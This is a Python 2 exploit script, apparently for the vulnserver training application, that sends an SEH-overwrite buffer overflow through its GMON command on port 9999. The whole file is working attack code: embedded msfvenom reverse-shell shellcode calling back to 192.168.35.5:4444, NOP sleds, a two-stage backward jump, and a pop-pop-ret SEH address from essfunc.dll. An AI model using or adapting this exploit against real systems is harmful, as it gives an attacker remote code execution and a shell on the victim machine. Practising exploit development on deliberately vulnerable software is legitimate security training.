#!/usr/bin/python

import socket
import os
import sys

# msfvenom shell_reverse_tcp LHOST=192.168.35.5 LPORT=4444 351 bytes
shellcode =  b""
shellcode += b"\xb8\xc5\x35\xa6\x36\xda\xd9\xd9\x74\x24\xf4\x5d\x31"
shellcode += b"\xc9\xb1\x52\x31\x45\x12\x03\x45\x12\x83\x28\xc9\x44"
shellcode += b"\xc3\x4e\xda\x0b\x2c\xae\x1b\x6c\xa4\x4b\x2a\xac\xd2"
shellcode += b"\x18\x1d\x1c\x90\x4c\x92\xd7\xf4\x64\x21\x95\xd0\x8b"
shellcode += b"\x82\x10\x07\xa2\x13\x08\x7b\xa5\x97\x53\xa8\x05\xa9"
shellcode += b"\x9b\xbd\x44\xee\xc6\x4c\x14\xa7\x8d\xe3\x88\xcc\xd8"
shellcode += b"\x3f\x23\x9e\xcd\x47\xd0\x57\xef\x66\x47\xe3\xb6\xa8"
shellcode += b"\x66\x20\xc3\xe0\x70\x25\xee\xbb\x0b\x9d\x84\x3d\xdd"
shellcode += b"\xef\x65\x91\x20\xc0\x97\xeb\x65\xe7\x47\x9e\x9f\x1b"
shellcode += b"\xf5\x99\x64\x61\x21\x2f\x7e\xc1\xa2\x97\x5a\xf3\x67"
shellcode += b"\x41\x29\xff\xcc\x05\x75\x1c\xd2\xca\x0e\x18\x5f\xed"
shellcode += b"\xc0\xa8\x1b\xca\xc4\xf1\xf8\x73\x5d\x5c\xae\x8c\xbd"
shellcode += b"\x3f\x0f\x29\xb6\xd2\x44\x40\x95\xba\xa9\x69\x25\x3b"
shellcode += b"\xa6\xfa\x56\x09\x69\x51\xf0\x21\xe2\x7f\x07\x45\xd9"
shellcode += b"\x38\x97\xb8\xe2\x38\xbe\x7e\xb6\x68\xa8\x57\xb7\xe2"
shellcode += b"\x28\x57\x62\xa4\x78\xf7\xdd\x05\x28\xb7\x8d\xed\x22"
shellcode += b"\x38\xf1\x0e\x4d\x92\x9a\xa5\xb4\x75\x65\x91\x95\x80"
shellcode += b"\x0d\xe0\xd9\x9b\x91\x6d\x3f\xf1\x39\x38\xe8\x6e\xa3"
shellcode += b"\x61\x62\x0e\x2c\xbc\x0f\x10\xa6\x33\xf0\xdf\x4f\x39"
shellcode += b"\xe2\x88\xbf\x74\x58\x1e\xbf\xa2\xf4\xfc\x52\x29\x04"
shellcode += b"\x8a\x4e\xe6\x53\xdb\xa1\xff\x31\xf1\x98\xa9\x27\x08"
shellcode += b"\x7c\x91\xe3\xd7\xbd\x1c\xea\x9a\xfa\x3a\xfc\x62\x02"
shellcode += b"\x07\xa8\x3a\x55\xd1\x06\xfd\x0f\x93\xf0\x57\xe3\x7d"
shellcode += b"\x94\x2e\xcf\xbd\xe2\x2e\x1a\x48\x0a\x9e\xf3\x0d\x35"
shellcode += b"\x2f\x94\x99\x4e\x4d\x04\x65\x85\xd5\x34\x2c\x87\x7c"
shellcode += b"\xdd\xe9\x52\x3d\x80\x09\x89\x02\xbd\x89\x3b\xfb\x3a"
shellcode += b"\x91\x4e\xfe\x07\x15\xa3\x72\x17\xf0\xc3\x21\x18\xd1"

# seh overwrite at offset 3518
nops1 = "\x90"*(3518-50-len(shellcode)) # subtract 50 to take 1st stage jmp into account
nops2 = "\x90"*10 # tiny nopslide in front of jmp_back
jmp_back = "\xD9\xEE\xD9\x74\x24\xF4\x59\x80\xC1\x0A\x90\xFE\xCD\xFE\xCD\xFF\xE1" # 2nd stage: jumps back 517 bytes into nops1 (nopslide into shellcode) 
nops3 = "\xCC"*(3518-(len(nops1)+len(shellcode)+len(nops2)+len(jmp_back)))
nseh = "\xEB\xCE\x90\x90" # 1st stage: jmp back 50 bytes
seh = "\xB4\x10\x50\x62" # 0x625010B4 pop pop ret in essfunc.dll

crash = nops1 + shellcode + nops2 + jmp_back + nops3 + nseh + seh
crash += "C"*(4000-len(crash)) # fill up to 4000 bytes

buf = "GMON /" + crash + "\r\n"

print "[*] Sending payload"

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("192.168.35.6", 9999))
expl.recv(1024) # read welcome message
expl.send(buf)
expl.close()
